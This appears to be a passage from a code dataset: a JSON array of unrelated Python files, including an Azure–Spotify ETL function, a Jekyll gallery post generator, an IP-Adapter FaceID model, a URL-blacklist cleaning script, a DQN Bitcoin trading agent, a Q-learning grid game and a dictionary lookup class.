spotipy.Spotify(client_credentials_manager=credentials)\n\n        # Fetch data from Spotify playlist\n        playlist_id = \"37i9dQZEVXbNG2KDcFcKOF\"\n        spotify_data = spotify.playlist_tracks(playlist_id)\n\n        # Initialize ADLS Gen2 client and get file system client\n        account_url = f\"https://{storage_account_name}.dfs.core.windows.net\"\n        service_client = DataLakeServiceClient(account_url=account_url, credential=storage_account_key)\n        file_system_client = service_client.get_file_system_client(file_system=storage_container)\n\n        # Create or get file client\n        timestamp = datetime.now().strftime(\"%Y-%m-%d_%H:%M:%S\")\n        file_name = f\"raw_data/to_processed/spotify_data_{timestamp}.json\"\n        file_client = file_system_client.get_file_client(file_name)\n\n        # Upload the data\n        file_client.upload_data(json.dumps(spotify_data), overwrite=True)\n\n        logging.info(f\"Successfully uploaded data to {file_name}\")\n\n        return None\n    except Exception as e:\n        logging.exception(f\"An error occurred during data extraction: {str(e)}\")\n\n\n@app.blob_trigger(\n    arg_name=\"myblob\",\n    path=storage_container + \"/raw_data/to_processed/{name}.json\",\n    connection=\"STORAGE_CONNECTION_STRING\"\n)\ndef spotify_data_transformation_load(myblob: func.InputStream):\n    \"\"\"Transforms and loads Spotify data stored in Azure Data Lake Storage Gen2.\n\n    Args:\n        myblob (func.InputStream): The input blob trigger.\n\n    Returns:\n        None\n    \"\"\"\n    spotify_data = process_blobs(storage_connection_string, storage_container)\n    album_df, artist_df, song_df = transform_data(spotify_data)\n\n    # Initialize ADLS Gen2 client and get file system client\n    account_url = f\"https://{storage_account_name}.dfs.core.windows.net\"\n\n    # Directly use the storage account key for authentication\n    service_client = DataLakeServiceClient(account_url=account_url, credential=storage_account_key)\n    file_system_client = service_client.get_file_system_client(file_system=storage_container)\n\n    # Format timestamp for filename\n    timestamp = datetime.now().strftime(\"%Y-%m-%d_%H-%M-%S\")\n\n    # Upload songs, album, artists to transformed_data directories\n    load_dataframe_to_adls(song_df, file_system_client, f\"transformed_data/songs_data/song_transformed_{timestamp}.csv\")\n    load_dataframe_to_adls(album_df, file_system_client, f\"transformed_data/album_data/album_transformed_{timestamp}.csv\")\n    load_dataframe_to_adls(artist_df, file_system_client, f\"transformed_data/artist_data/artist_transformed_{timestamp}.csv\")\n\n    # Move the raw_data from to_processed to processed\n    copy_files_and_cleanup(file_system_client, \"raw_data/to_processed\", \"raw_data/processed\")\n\n\ndef process_blobs(storage_connection_string, storage_container):\n    \"\"\"Processes Spotify data blobs stored in Azure Data Lake Storage Gen2.\n\n    Args:\n        storage_connection_string (str): The connection string to the storage account.\n        storage_container (str): The name of the storage container.\n\n    Returns:\n        list: A list of Spotify data extracted from blobs.\n    \"\"\"\n    blob_service_client = BlobServiceClient.from_connection_string(conn_str=storage_connection_string)\n    container_client = blob_service_client.get_container_client(container=storage_container)\n    file_prefix = \"/raw_data/to_processed/spotify_data\"\n    spotify_data = []\n\n    for blob in container_client.list_blobs(name_starts_with=file_prefix):\n        if blob.name.endswith(\".json\"):\n            logging.info(f\"Processing {blob.name}\")\n\n            # Retrieve the blob's content\n            blob_client = container_client.get_blob_client(blob.name)\n            blob_content = blob_client.download_blob().readall()\n          ",
    "#!/usr/bin/env python\n# demo: python .\\generate_post_md.py --title \u6d4b\u8bd5title --category \u5206\u7c7b1 --tag Tag1 --urls url1 url2 --column 2\nimport argparse\nimport datetime\n\ndef generate_markdown_file(title, category, tag, urls, column):\n    # \u6839\u636e\u5f53\u524d\u65e5\u671f\u548c\u6807\u9898\u751f\u6210\u6587\u4ef6\u540d\n    file_name_date = datetime.date.today().strftime(\"%Y-%m-%d\")\n    filename = f\"./_posts/{file_name_date}-{title}.md\"\n\n    post_time = datetime.datetime.now().strftime(\"%Y-%m-%d %H:%M:%S\")\n\n    # \u6784\u5efaMarkdown\u6587\u4ef6\u5185\u5bb9\n    content = f\"\"\"---\ntitle: {title}\ndate: {post_time} +/-TTTT\ncategories: {category}\ntags: {tag}\n---\n\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <style>\n        .gallery {{\n            column-count: {column}; /* \u8bbe\u7f6e\u5217\u6570 */\n            column-gap: 10px; /* \u8bbe\u7f6e\u5217\u4e4b\u95f4\u7684\u95f4\u9699 */\n        }}\n        .gallery img {{\n            width: 100%;\n            break-inside: avoid; /* \u907f\u514d\u56fe\u7247\u8de8\u5217\u663e\u793a */\n            margin-bottom: 10px; /* \u8bbe\u7f6e\u56fe\u7247\u4e4b\u95f4\u7684\u95f4\u9699 */\n        }}\n    </style>\n</head>\n<body>\n\n<div class=\"gallery\">\n\"\"\"\n\n    # \u6dfb\u52a0\u56fe\u7247URL\n    for url in urls:\n        content += f'    <img src=\"{url}\" alt=\"Photo\">\\n'\n\n    content += \"\"\"\n    <!-- \u66f4\u591a\u56fe\u7247 -->\n</div>\n\n</body>\n\"\"\"\n    print(content)\n    # \u5c06\u5185\u5bb9\u5199\u5165\u6587\u4ef6\n    with open(filename, \"w\", encoding=\"utf-8\") as file:\n        file.write(content)\n\n    print(f\"Markdown\u6587\u4ef6\u5df2\u751f\u6210\uff1a{filename}\")\n\nif __name__ == '__main__':\n    # \u521b\u5efa\u547d\u4ee4\u884c\u53c2\u6570\u89e3\u6790\u5668\n    parser = argparse.ArgumentParser(description=\"\u751f\u6210Markdown\u6587\u4ef6\")\n    parser.add_argument(\"--title\", help=\"\u6807\u9898\")\n    parser.add_argument(\"--category\", help=\"\u5206\u7c7b\uff08\u591a\u4e2a\u5206\u7c7b\u8bf7\u7528\u9017\u53f7\u5206\u9694\uff09\")\n    parser.add_argument(\"--tag\", help=\"\u6807\u7b7e\uff08\u591a\u4e2a\u6807\u7b7e\u8bf7\u7528\u9017\u53f7\u5206\u9694\uff09\")\n    parser.add_argument(\"--urls\", nargs=\"+\", help=\"\u56fe\u7247URL\uff08\u591a\u4e2aURL\u8bf7\u7528\u7a7a\u683c\u5206\u9694\uff09\")\n    parser.add_argument(\"--column\", type=int, default=2, help=\"\u7011\u5e03\u6d41\u6392\u7248\u5217\u6570\")\n\n    # \u89e3\u6790\u547d\u4ee4\u884c\u53c2\u6570\n    args = parser.parse_args()\n    print(args.urls)\n    # \u751f\u6210Markdown\u6587\u4ef6\n    generate_markdown_file(args.title, args.category.split(\",\"), args.tag.split(\",\"), args.urls, args.column)",
    "\nimport os\nimport pdb\nfrom typing import List\n\nimport numpy as np\nimport torch\nfrom safetensors import safe_open\nfrom transformers import CLIPImageProcessor, CLIPVisionModelWithProjection\nfrom garment_seg.process import load_seg_model, generate_mask\n\nfrom utils.utils import is_torch2_available, prepare_image, prepare_mask\nimport copy\nfrom utils.resampler import PerceiverAttention, FeedForward\nfrom insightface.utils import face_align\nfrom insightface.app import FaceAnalysis\nimport cv2\n\nUSE_DAFAULT_ATTN = False  # should be True for visualization_attnmap\nif is_torch2_available() and (not USE_DAFAULT_ATTN):\n    from .attention_processor import AttnProcessor2_0 as AttnProcessor\n    from .attention_processor import IPAttnProcessor2_0 as IPAttnProcessor\n    from .attention_processor import REFAttnProcessor2_0 as REFAttnProcessor\nelse:\n    from .attention_processor import AttnProcessor, IPAttnProcessor, REFAttnProcessor\n\n\nclass FacePerceiverResampler(torch.nn.Module):\n    def __init__(\n            self,\n            *,\n            dim=768,\n            depth=4,\n            dim_head=64,\n            heads=16,\n            embedding_dim=1280,\n            output_dim=768,\n            ff_mult=4,\n    ):\n        super().__init__()\n\n        self.proj_in = torch.nn.Linear(embedding_dim, dim)\n        self.proj_out = torch.nn.Linear(dim, output_dim)\n        self.norm_out = torch.nn.LayerNorm(output_dim)\n        self.layers = torch.nn.ModuleList([])\n        for _ in range(depth):\n            self.layers.append(\n                torch.nn.ModuleList(\n                    [\n                        PerceiverAttention(dim=dim, dim_head=dim_head, heads=heads),\n                        FeedForward(dim=dim, mult=ff_mult),\n                    ]\n                )\n            )\n\n    def forward(self, latents, x):\n        x = self.proj_in(x)\n        for attn, ff in self.layers:\n            latents = attn(x, latents) + latents\n            latents = ff(latents) + latents\n        latents = self.proj_out(latents)\n        return self.norm_out(latents)\n\n\nclass MLPProjModel(torch.nn.Module):\n    def __init__(self, cross_attention_dim=768, id_embeddings_dim=512, num_tokens=4):\n        super().__init__()\n\n        self.cross_attention_dim = cross_attention_dim\n        self.num_tokens = num_tokens\n\n        self.proj = torch.nn.Sequential(\n            torch.nn.Linear(id_embeddings_dim, id_embeddings_dim * 2),\n            torch.nn.GELU(),\n            torch.nn.Linear(id_embeddings_dim * 2, cross_attention_dim * num_tokens),\n        )\n        self.norm = torch.nn.LayerNorm(cross_attention_dim)\n\n    def forward(self, id_embeds):\n        x = self.proj(id_embeds)\n        x = x.reshape(-1, self.num_tokens, self.cross_attention_dim)\n        x = self.norm(x)\n        return x\n\n\nclass ProjPlusModel(torch.nn.Module):\n    def __init__(self, cross_attention_dim=768, id_embeddings_dim=512, clip_embeddings_dim=1280, num_tokens=4):\n        super().__init__()\n\n        self.cross_attention_dim = cross_attention_dim\n        self.num_tokens = num_tokens\n\n        self.proj = torch.nn.Sequential(\n            torch.nn.Linear(id_embeddings_dim, id_embeddings_dim * 2),\n            torch.nn.GELU(),\n            torch.nn.Linear(id_embeddings_dim * 2, cross_attention_dim * num_tokens),\n        )\n        self.norm = torch.nn.LayerNorm(cross_attention_dim)\n\n        self.perceiver_resampler = FacePerceiverResampler(\n            dim=cross_attention_dim,\n            depth=4,\n            dim_head=64,\n            heads=cross_attention_dim // 64,\n            embedding_dim=clip_embeddings_dim,\n            output_dim=cross_attention_dim,\n            ff_mult=4,\n        )\n\n    def forward(self, id_embeds, clip_embeds, shortcut=False, scale=1.0):\n        x = self.proj(id_embeds)\n        x = x.reshape(-1, self.num_tokens, self.cross_attention_dim)\n        x = self.norm(x)\n        out = self.perceiver_resampler(x, clip_embeds)\n        if shortcut:\n            out = x + scale * out\n        return out\n\n\nclass IPAdapterFaceID:\n    def __init__(self, sd_pipe, ref_path, ip_ckpt, device, enable_cloth_guidance, num_tokens=4, n_cond=1, torch_dtype=torch.float16, set_seg_model=True):\n        self.enable_cloth_guidance = enable_cloth_guidance\n        self.device = device\n        self.ip_ckpt = ip_ckpt\n        self.num_tokens = num_tokens\n        self.n_cond = n_cond\n        self.torch_dtype = torch_dtype\n\n        self.pipe = sd_pipe.to(self.device)\n        self.set_ip_adapter()\n\n        # image proj model\n        self.image_proj_model = self.init_proj()\n\n        self.load_ip_adapter()\n\n        self.set_insightface()\n\n        ref_unet = copy.deepcopy(sd_pipe.unet)\n        state_dict = {}\n        with safe_open(ref_path, framework=\"pt\", device=\"cpu\") as f:\n            for key in f.keys():\n                state_dict[key] = f.get_tensor(key)\n        ref_unet.load_state_dict(state_dict, strict=False)\n\n        self.ref_unet = ref_unet.to(self.device)\n        self.set_ref_adapter()\n        if set_seg_model:\n         ",
    "# coding=utf-8\n# Copyright (c) 2020, NVIDIA CORPORATION.  All rights reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\n\nimport glob\nimport re\nimport time\nimport tldextract\nimport sys\n\n\n# List of the domains to blacklist.\ndomain_blacklist = set([\n    '500px',\n    'aapks',\n    'akamaihd',\n    'amazon',\n    'apple',\n    'artifactfire',\n    'artstation',\n    'awwni',\n    'bandcamp',\n    'battleforthenet',\n    'coinscalendar',\n    'dailymotion',\n    'deviantart',\n    'discord',\n    'discordapp',\n    'dlapkandroid',\n    'dropbox',\n    'e621',\n    'ebay',\n    'edealinfo',\n    'erome',\n    'eroshare',\n    'explosm',\n    'facebook',\n    'fbcdn',\n    'flickr',\n    'furaffinity',\n    'futhead',\n    'gatopardo',\n    'gfycat',\n    'gifsound',\n    'gifsoup',\n    'giphy',\n    'github',\n    'google',\n    'gunprime',\n    'gyazo',\n    'hotdealstar',\n    'imagefap',\n    'imageshack',\n    'imgflip',\n    'imgur',\n    'instagram',\n    'karmadecay',\n    'kryptocal',\n    'kym-cdn',\n    'liveleak',\n    'livememe',\n    'lmgtfy',\n    'magaimg',\n    'memegenerator',\n    'minorplanetcenter',\n    'minus',\n    'mobafire',\n    'morejpeg',\n    'nocookie',\n    'pcpartpicker',\n    'photobucket',\n    'pinimg',\n    'pinterest',\n    'pixiv',\n    'pornhub',\n    'prntscr',\n    'puu',\n    'qkme',\n    'quickmeme',\n    'radd',\n    'redd',\n    'reddit',\n    'reddit-stream',\n    'redditlog',\n    'redditmedia',\n    'reddituploads',\n    'redtube',\n    'reupp',\n    'reverb',\n    'roanoke',\n    'rollingstone',\n    'sli',\n    'soundcloud',\n    'soundgasm',\n    'spankbang',\n    'spotify',\n    'strawpoll',\n    'streamable',\n    'timeanddate',\n    'tinypic',\n    'touhouradio',\n    'tumblr',\n    'twimg',\n    'twitch',\n    'twitter',\n    'vid',\n    'vimeo',\n    'vine',\n    'vkaao',\n    'vocaroo',\n    'voyagefusion',\n    'walmart',\n    'wciu',\n    'wikimedia',\n    'wikipedia',\n    'xhamster',\n    'xkcd',\n    'xvideos',\n    'youtu',\n    'youtube',\n    'youtubedoubler',\n    'ytimg',\n    'zillexplorer',\n])\n\ndef domain_is_in_blacklist(url):\n    domain = tldextract.extract(url).domain\n    return domain in domain_blacklist\n\n\n# List of extentions to blacklist.\nextentions_blacklist = (\n    '.3gp',\n    '.7z'\n    '.ai',\n    '.aif',\n    '.apk',\n    '.app',\n    '.avi',\n    '.bin',\n    '.bmp',\n    '.bz2',\n    '.css',\n    '.csv',\n    '.dat',\n    '.deb',\n    '.dmg',\n    '.doc',\n    '.docx',\n    '.exe',\n    '.gif',\n    '.gifv',\n    '.gz',\n    '.iso',\n    '.jar',\n    '.jpeg',\n    '.jpg',\n    '.js',\n    '.log',\n    '.mid',\n    '.midi',\n    '.mkv',\n    '.mov',\n    '.mp3',\n    '.mp4',\n    '.mpeg',\n    '.mpg',\n    '.ogg',\n    '.ogv',\n    '.otf',\n    '.pdf',\n    '.pkg',\n    '.png',\n    '.pps',\n    '.ppt',\n    '.pptx',\n    '.psd',\n    '.py',\n    '.qt',\n    '.ram',\n    '.rar',\n    '.sql',\n    '.svg',\n    '.swf',\n    '.tar.gz',\n    '.tar',\n    '.tgz',\n    '.tiff',\n    '.ttf',\n    '.txt',\n    '.wav',\n    '.webm',\n    '.wma',\n    '.wmv',\n    '.xls',\n    '.xlsx',\n    '.xml',\n    '.xz',\n    '.zip',\n)\n\ndef extention_is_in_blacklist(url):\n    if url.split('?')[0].lower().endswith(extentions_blacklist):\n        return True\n    return False\n\n\n# Malformed urls.\n# This function is adapted from:\n#   https://stackoverflow.com/questions/7160737/python-how-to-validate-a-url-in-python-malformed-or-not\nurl_regex = re.compile(\n    r'^(?:http)s?://' # http:// or https://\n    r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\\.)+(?:[A-Z]{2,6}\\.?|[A-Z0-9-]{2,}\\.?)|' #domain...\n    r'\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})' # ...or ip\n    r'(?::\\d+)?' # optional port\n    r'(?:/?|[/?]\\S+)$', re.IGNORECASE)\ndef url_is_malformed(url):\n    return re.match(url_regex, url) is None\n\n\ndef print_progress(prefix, start_time, urls_counter,\n                   domain_blacklist_counter,\n                   extention_blacklist_counter,\n                   short_url_counter, malformed_url_counter,\n                   duplicate_url_counter):\n    string = prefix + ' | '\n    string += 'time elapsed (s): {:.2f} | '.format(time.time() - start_time)\n    string += 'number of urls: {} | '.format(urls_counter)\n    string += 'domain blacklisted: {} | '.format(domain_blacklist_counter)\n    string += 'extention blacklisted: {} | '.format(extention_blacklist_counter)\n    string += 'short urls (<=8): {} | '.format(short_url_counter)\n    string += 'malformed urls: {} | '.format(malformed_url_counter)\n    string += 'duplicate urls: {}'.format(duplicate_url_counter)\n    print(string, flush=True)\n\n\nif __name__ == '__main__':\n\n\n    print('remove blacklisted",
    "# trading_agent.py\nimport numpy as np\nimport pandas as pd\nimport matplotlib.pyplot as plt\nfrom trading_env import BitcoinTradingEnv\nfrom collections import deque\nimport random\nfrom keras.models import Sequential\nfrom keras.layers import Dense\nfrom keras.optimizers import Adam\n\nclass TradingAgent:\n    def __init__(self, state_size, action_size):\n        self.state_size = state_size\n        self.action_size = action_size\n        self.memory = deque(maxlen=5000)\n        self.gamma = 0.99  # discount rate\n        self.epsilon = 1.0  # exploration rate\n        self.epsilon_min = 0.01\n        self.epsilon_decay = 0.995\n        self.learning_rate = 0.001\n        self.model = self._build_model()\n\n    def _build_model(self):\n        model = Sequential()\n        model.add(Dense(64, input_dim=self.state_size, activation='relu'))\n        model.add(Dense(128, activation='relu'))\n        model.add(Dense(64, activation='relu'))\n        model.add(Dense(self.action_size, activation='linear'))\n        model.compile(loss='mse', optimizer=Adam(learning_rate=self.learning_rate))\n        return model\n\n    def remember(self, state, action, reward, next_state, done):\n        self.memory.append((state, action, reward, next_state, done))\n\n    def act(self, state):\n        if np.random.rand() <= self.epsilon:\n            return random.randrange(self.action_size)\n        act_values = self.model.predict(state)\n        return np.argmax(act_values[0])\n\n    def train(self, batch_size):\n        minibatch = random.sample(self.memory, batch_size)\n        for state, action, reward, next_state, done in minibatch:\n            target = reward\n            if not done:\n                target = (reward + self.gamma *\n                          np.amax(self.model.predict(next_state)[0]))\n            target_f = self.model.predict(state)\n            target_f[0][action] = target\n            self.model.fit(state, target_f, epochs=1, verbose=0)\n        if self.epsilon > self.epsilon_min:\n            self.epsilon *= self.epsilon_decay\n\n# Load historical Bitcoin price and volume data\ndf = pd.read_csv('BTCUSDT_historical_data.csv')  # Assuming you have a CSV file with price and volume data\n\n# Normalize the data\nprice_mean = df['Close'].mean()\nprice_std = df['Close'].std()\nvolume_mean = df['Volume'].mean()\nvolume_std = df['Volume'].std()\ndf['Open'] = (df['Open'] - price_mean) / price_std\ndf['High'] = (df['High'] - price_mean) / price_std\ndf['Low'] = (df['Low'] - price_mean) / price_std\ndf['Close'] = (df['Close'] - price_mean) / price_std\ndf['Volume'] = (df['Volume'] - volume_mean) / volume_std\n\n# Create the environment and agent\nenv = BitcoinTradingEnv(df)\nstate_size = env.observation_space.shape[0]\naction_size = env.action_space.n\nagent = TradingAgent(state_size, action_size)\n\n# Training parameters\nnum_episodes = 100\nbatch_size = 32\n\n# Lists to store rewards and balances for each episode\nrewards_list = []\nbalances_list = []\n\n# Training loop\nfor episode in range(num_episodes):\n    state = env.reset()\n    state = np.reshape(state, [1, state_size])\n    done = False\n    total_reward = 0\n    \n    while not done:\n        action = agent.act(state)\n        next_state, reward, done, info = env.step(action)\n        next_state = np.reshape(next_state, [1, state_size])\n        agent.remember(state, action, reward, next_state, done)\n        state = next_state\n        total_reward += reward\n        \n        if len(agent.memory) > batch_size:\n            agent.train(batch_size)\n    \n    rewards_list.append(total_reward)\n    balances_list.append(info['balance'])\n    \n    print(f\"Episode: {episode+1}/{num_episodes}, Reward: {total_reward:.2f}, Balance: {info['balance']:.2f}\")\n\n# Plot the rewards and balances\nplt.figure(figsize=(12, 6))\nplt.subplot(1, 2, 1)\nplt.plot(rewards_list)\nplt.xlabel('Episode')\nplt.ylabel('Total Reward')\nplt.title('Rewards per Episode')\n\nplt.subplot(1, 2, 2)\nplt.plot(balances_list)\nplt.xlabel('Episode')\nplt.ylabel('Balance')\nplt.title('Balance per Episode')\n\nplt.tight_layout()\nplt.show()",
    "# -*- coding: utf-8 -*-\n# -------------------------\n# @Author   : xielianbin\n# @Time     : 2024/4/1  10:43\n# @Email    : 2826389624@qq.com\n# @Function : \u521d\u7ea7\u5f3a\u5316\u5b66\u4e60\u7ec3\u4e60\uff0c\u6355\u98df\u8005\u6e38\u620f\n# -------------------------\nimport numpy as np\nimport cv2\nfrom PIL import Image\nimport time\nimport pickle\nimport matplotlib.pyplot as plt\nfrom matplotlib import style\nfrom common_block.Agent import Agent\nfrom common_block.Config import Config\nstyle.use('ggplot')\ndef train():\n    # 1\u3001\u5bfc\u5165\u5e93\n    # 2\u3001\u53c2\u6570\u5b9a\u4e49\n    config=Config()\n    # 3\u3001\u521b\u5efa\u667a\u80fd\u4f53\u7684Agent()\u7c7b\uff08\u5b9a\u4e49\u667a\u80fd\u4f53\u7684\u521d\u59cb\u4f4d\u7f6e\u53ca\u5176\u52a8\u4f5c\u51fd\u6570\uff09\n    # 4\u3001\u521d\u59cb\u5316\u73af\u5883env\n    # \u521d\u59cb\u5316\u73af\u5883env\n    if config.env is None:  # \u5982\u679c\u6ca1\u6709\u5b9e\u73b0\u63d0\u4f9b\uff0c\u5c31\u968f\u673a\u521d\u59cb\u5316\u4e00\u4e2aQ\u8868\u683c\n        config.env = {}\n        for x1 in range(-config.size + 1, config.size): # x1:[-9, 10]\n            for y1 in range(-config.size + 1, config.size):\n                for x2 in range(-config.size + 1, config.size):\n                    for y2 in range(-config.size + 1, config.size):\n                        config.env[((x1, y1), (x2, y2))] = [np.random.randint(-5, 0) for i in range(4)]\n    else:  # \u63d0\u4f9b\u4e86\uff0c\u5c31\u4f7f\u7528\u63d0\u4f9b\u7684Q\u8868\u683c\n        with open(config.env, 'rb') as f:\n            env = pickle.load(f)\n    # 5\u3001\u8bad\u7ec3\n    # \u8bad\u7ec3\u4e00\u4e2a\u667a\u80fd\u4f53\n    episode_rewards = []  # \u521d\u59cb\u5316\u5956\u52b1\u5e8f\u5217\n    for episode in range(config.episodes):  # \u8fed\u4ee3\u591a\u5c11\u8f6e\n        # \u5b9e\u4f8b\u5316\u73a9\u5bb6\u3001\u98df\u7269\u548c\u654c\u4eba\n        player = Agent(config.size)\n        food = Agent(config.size)\n        enemy = Agent(config.size)\n\n        # \u6bcf\u9694\u4e00\u6bb5\u65f6\u95f4\u8bbe\u5b9ashow\u4e3aTrue\uff0c\u663e\u793a\u56fe\u50cf\n        if episode % config.show_every == 0:\n            print('episode ', episode, '  epsilon:', config.epsilon)\n            print('mean_reward:', np.mean(episode_rewards[-config.show_every:]))\n            show = True\n        else:\n            show = False\n        # \u8ba1\u7b97\u8fd9\u4e00\u8f6e\u7684\u5956\u52b1\u5206\u6570\n        episode_reward = 0\n        for i in range(200):\n            obs = (player - food, player - enemy)  # ((-4, -2), (0, 4)) # \u89c2\u6d4b\n            # \u5f00\u53d1\u548c\u63a2\u7d22\u5e76\u5b58\n            if np.random.random() > config.epsilon:\n                action = np.argmax(config.env[obs])  # \u9009\u62e9Q\u503c\u6700\u9ad8\u7684\u52a8\u4f5c\uff0c\u6765\u8fdb\u884c\u5f00\u53d1\n            else:\n                action = np.random.randint(0, 4)  # \u968f\u673a\u9009\u62e9\u4e00\u4e2a\u52a8\u4f5c\uff0c\u8fdb\u884c\u63a2\u7d22\n\n            # print(\"player\u7684\u4f4d\u7f6e\uff1a\",player)\n            # print(\"player\u7684\u89c2\u6d4b\uff1a\",obs)\n            # print(\"player\u7684\u52a8\u4f5c\uff1a\",action)\n            player.action(action)  # \u667a\u80fd\u4f53\u6267\u884c\u52a8\u4f5c\n            # food.move()\n            # enemy.move()\n            # print(\"player\u7684\u4e0b\u4e00\u6b65\u4f4d\u7f6e\uff1a\",player)\n            # \u5956\u52b1\u548c\u60e9\u7f5a\u7684\u8ba1\u7b97\n            if player.x == food.x and player.y == food.y:\n                reward = config.food_reward\n            elif player.x == enemy.x and player.y == enemy.y:\n                reward = - config.enemy_penality\n            else:\n                reward = - config.move_penality\n\n            # \u66f4\u65b0\u73af\u5883\n            current_env = config.env[obs][action]  # \u5f53\u524d\u52a8\u4f5c\u3001\u72b6\u6001\u5bf9\u5e94\u7684obs\u5750\u6807\u503c\n            # print('current_q:',current_q)\n            new_obs = (player - food, player - enemy)  # \u52a8\u4f5c\u4e4b\u540e\u65b0\u7684\u72b6\u6001\n            # print('new_obs:',new_obs)\n            max_future_q = np.max(config.env[new_obs])  # \u65b0\u7684\u72b6\u6001\u4e0b\uff0c\u6700\u5927\u7684Q\u503c\n            # print('max_future_q:',max_future_q)\n            # new_q\u8ba1\u7b97\u7684\u662f\u6743\u91cd\uff0c\u5f80\u54ea\u8fb9\u8d70\u7684\u6743\u91cd\uff0c\u83b7\u5f97\u98df\u7269\u5c31\u5956\u52b125\u5206\uff0c\u5176\u4ed6\u7684\u5c31\u6309\u7167\u5b66\u4e60\u7387\u7684\u6bd4\u4f8b\u6765\u51cf\uff0c\n            if reward == config.food_reward:\n                new_q = config.food_reward\n            else:\n                new_q = (1 - config.learning_rate) * current_env + config.learning_rate * (reward + config.discount * max_future_q)\n            config.env[obs][action] = new_q\n            print(new_q)\n\n            # \u56fe\u50cf\u663e\u793a\n            if show:\n                # \u521d\u59cb\u5316\u73af\u5883\uff0c\u51680\n                env = np.zeros((config.size, config.size, 3), dtype=np.uint8)\n                # \u521d\u59cb\u5316\u89d2\u8272\u989c\u8272\uff0c\u7eff\u8272\u662f\u4e8b\u7269\uff0c\u84dd\u8272\u662f\u73a9\u5bb6\uff0c\u7ea2\u8272\u662f\u654c\u4eba\n                env[food.x][food.y] = config.d[config.food_n]\n                env[player.x][player.y] = config.d[config.player_n]\n                env[enemy.x][enemy.y] = config.d[config.enemy_n]\n                # \u5c06\u6570\u7ec4\u8f6c\u4e3a\u56fe\u50cf\n                img = Image.fromarray(env, 'RGB')\n                # \u56fe\u50cf\u5927\u5c0f\n                img = img.resize((800, 800))\n                cv2.imshow('', np.array(img))\n                if reward == config.food_reward or reward == -config.enemy_penality:\n                    if cv2.waitKey(500) & 0xFF == ord('q'):\n                        break\n                else:\n                    if cv2.waitKey(1) & 0xFF == ord('q'):\n                        break\n            # \u6dfb\u52a0\u7761\u7720\u65f6\u95f4\uff0c\u589e\u52a0\u53ef\u89c6\u5316\u6548\u679c\n            time.sleep(0.1)\n            episode_reward += reward\n            # \u9047\u4e0a\u5bf9\u624b\u6216\u8005\u654c\u4eba\u5c31\u9000\u51fa\n            if reward == config.food_reward or reward == config.enemy_penality:\n                break\n        episode_rewards.append(episode_reward)\n        config.epsilon *= config.eps_decay\n\n    # 6\u3001\u8f93\u51fa\u5956\u52b1\u66f2\u7ebf\n    moving_avg = np.convolve(episode_rewards, np.ones((config.show_every,)) / config.show_every, mode='valid')\n    plt.plot([i for i in range(len(moving_avg))], moving_avg)\n    plt.xlabel('episode #')\n    plt.ylabel(f'mean{config.show_every} reward')\n    plt.show()\n    # 7\u3001\u4fdd\u5b58\u6587\u4ef6\n    with open(f'qtable_{int(time.time())}.pickle', 'wb') as f:\n        pickle.dump(env, f)\nif __name__ == '__main__':\n     train()",
    "\"\"\"\r\nPLP Week 4 min-project\r\n\r\nLearn how to load json data into a python dictionary\r\nCreate a function that returns a definition of a word\r\nConsider a condition that the entered word is not in a dictionary\r\nConsider input from user having different cases \u2013 upper/ lower case or mixed eg: RAIN/rain/RaIN\r\nMake your dictionary program more intelligent incase users input a word with wrong spelling the program should be able to suggest the word that might be intended.\r\neg . pott instead of pot or rainn instead of rain.\r\nTip: use difflib library here\r\n\"\"\"\r\n\r\n# pip install orjson\r\nimport orjson\r\nfrom difflib import get_close_matches\r\n\r\n\r\nclass Dictionary:\r\n    \"\"\"dictionary that gets difinations from a JSON file\"\"\"\r\n\r\n    __slots__ = (\r\n        \"word_definitions\",\r\n        \"dictfile\",\r\n        \"words\",\r\n        \"case\",\r\n    )\r\n\r\n    def __init__(self, dictfile: str):\r\n        # store filename for future ref\r\n        self.dictfile = dictfile\r\n        # read dictfile on startup\r\n        self._read_file()\r\n\r\n    def _read_file(self):\r\n        \"\"\"read dictfile and update dictionary\"\"\"\r\n        with open(self.dictfile, \"rb\") as file:\r\n            # get words and definitions\r\n            self.word_definitions: dict = orjson.loads(file.read())\r\n        # get words for suggestions\r\n        self.words = list(self.word_definitions.keys())\r\n\r\n    def search(self, word: str) -> str | None:\r\n        \"\"\"search the definition of word in dictionary\"\"\"\r\n        # if definition is None; suggest a word that's close\r\n        if definition := self.word_definitions.get(word):\r\n            return definition\r\n\r\n    def suggest(self, word: str, **kwargs):\r\n        \"\"\"use difflib to suggest close words to word\"\"\"\r\n        matches = get_close_matches(word, self.words, **kwargs)\r\n        return matches\r\n\r\n    def change_file(self, filename: str):\r\n        \"\"\"change dictfile during runtime\"\"\"\r\n        self.dictfile = filename\r\n        self._read_file()\r\n",
